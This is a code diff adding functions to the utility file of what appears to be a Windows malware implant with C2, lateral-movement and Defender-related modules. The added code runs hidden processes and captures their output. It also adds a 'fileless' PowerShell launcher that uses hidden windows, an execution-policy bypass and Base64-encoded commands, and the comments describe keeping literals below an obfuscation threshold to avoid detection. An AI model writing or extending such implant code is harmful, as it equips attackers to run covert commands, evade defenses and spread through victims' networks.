@@ -1,6 +1,7 @@
 // utils.cpp — String conversion, Base64, AES-GCM + ECDH P-256 (BCrypt),
 // SHA-256, system info, jitter sleep.
 #include "utils.hpp"
+#include "config.hpp"
 #include "ghostcore.hpp"
 #include "obfuscate.hpp"
 #include <windows.h>
@@ -457,4 +458,69 @@ VOID JitterSleep(DWORD minSec, DWORD maxSec) {
     } else {
         Sleep(static_cast<DWORD>(ms));
     }
+}
+// ---------------------------------------------------------------------------
+// Hidden process with captured output
+// ---------------------------------------------------------------------------
+// The pipe/read/wait core, lifted out of RunFilelessPS when the lateral
+// movement vectors became a second caller (winrs, net, schtasks all need their
+// stdout captured). The command line is passed verbatim, so callers own
+// quoting.
+std::wstring RunHiddenCapture(const std::wstring& cmdLine) {
+    SECURITY_ATTRIBUTES sa = { sizeof(sa), nullptr, TRUE };
+    HANDLE hRead = nullptr, hWrite = nullptr;
+    if (!CreatePipe(&hRead, &hWrite, &sa, 0))
+        return L"[error: pipe failed]";
+    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);
+
+    STARTUPINFOW si = {};
+    si.cb = sizeof(si);
+    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+    si.hStdOutput = hWrite;
+    si.hStdError  = hWrite;
+    si.hStdInput  = nullptr; // no console in -mwindows build; NULL avoids INVALID_HANDLE crash
+
+    std::wstring mutableCmd = cmdLine;   // CreateProcessW may write to the buffer
+    PROCESS_INFORMATION pi = {};
+    BOOL ok = CreateProcessW(nullptr, &mutableCmd[0], nullptr, nullptr, TRUE,
+                             CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
+    CloseHandle(hWrite);
+    if (!ok) {
+        CloseHandle(hRead);
+        return L"[error: CreateProcess failed, code " + std::to_wstring(GetLastError()) + L"]";
+    }
+
+    std::string output;
+    output.reserve(4096);
+    char buf[4096];
+    DWORD bytesRead = 0;
+    while (output.size() < config::CMD_OUTPUT_MAX) {
+        if (!ReadFile(hRead, buf, sizeof(buf), &bytesRead, nullptr) || bytesRead == 0)
+            break;
+        output.append(buf, bytesRead);
+    }
+    if (WaitForSingleObject(pi.hProcess, config::CMD_TIMEOUT_MS) == WAIT_TIMEOUT)
+        TerminateProcess(pi.hProcess, 1);
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+    CloseHandle(hRead);
+    return UTF8ToWString(output);
+}
+
+// ---------------------------------------------------------------------------
+// Fileless PowerShell runner
+// ---------------------------------------------------------------------------
+// Moved here from src/c2.cpp when the Defender module became a second caller.
+// The command line is built at runtime (SystemRoot is not a build-time value)
+// but contains no literal above the obfuscation threshold: powershell.exe is
+// resolved under the system root and the script itself arrives Base64-encoded.
+std::wstring RunFilelessPS(const std::string& b64Command) {
+    wchar_t sysRoot[MAX_PATH] = {};
+    GetEnvironmentVariableW(L"SystemRoot", sysRoot, MAX_PATH);
+    std::wstring ps = std::wstring(sysRoot) +
+                      L"\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
+    return RunHiddenCapture(L"\"" + ps + L"\" -NoProfile -NonInteractive "
+                            L"-WindowStyle Hidden -ExecutionPolicy Bypass "
+                            L"-EncodedCommand " + UTF8ToWString(b64Command));
 }
